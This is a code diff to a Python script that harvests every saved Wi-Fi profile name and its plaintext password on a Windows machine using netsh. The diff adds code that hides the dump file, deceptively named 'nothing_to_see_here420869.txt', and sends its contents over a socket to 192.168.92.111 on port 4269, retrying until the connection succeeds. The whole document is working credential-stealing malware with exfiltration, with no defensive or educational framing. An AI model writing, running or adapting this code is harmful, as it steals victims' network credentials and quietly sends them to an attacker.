@@ -1,8 +1,12 @@
 import subprocess
 import re
+import socket
+import time
+import ctypes
+import os
 
 wifi_list = []
-#this list will store the passwords and name of wifi temporalily
+#this list will store the passwords and name of wifi temporally
 cmd_output1 = subprocess.run(
     ["netsh", "wlan", "show", "profiles"], 
     capture_output = True, 
@@ -18,7 +22,7 @@ outputs = re.findall(r"All User Profile\s*:\s*(.+)",
 for output in outputs:
 
     wifi_dic = {}
-#All the wifi names and passwords are saved in thiss dictionary
+#All the wifi names and passwords are saved in this dictionary
     wifi_name = re.sub(r'[\[\]"]', '', output.strip())
 #Strips the brackets
     cmdoutput2 = subprocess.run(
@@ -39,10 +43,29 @@ with open ('nothing_to_see_here420869.txt', 'w') as f:
     f.write(str(wifi_list))
 #it makes a file and writes the passwords in
 
-#the part below is to make sure its working. delete it when using
-with open ('nothing_to_see_here420869.txt') as f:
-    print(f.read())
+#Sending via socket to a specific ip
+HOST = '192.168.92.111'
+PORT = 4269
+file= 'nothing_to_see_here420869.txt'
 
-        
+if os.path.exists(file):
+    # 0x02 sets the file attribute to hidden
+    ctypes.windll.kernel32.SetFileAttributesW(file, 0x02)
+
+
+with open (file, 'rb') as file, socket.socket() as s:
+
+    while True:
+
+        try:
+            s.connect((HOST, PORT))
+            break 
+        except (ConnectionRefusedError, TimeoutError):
+            time.sleep(1)
+
+    while True:
+        chunk = file.read(4096)
+        if not chunk:
+            break 
+        s.sendall(chunk)
     
-
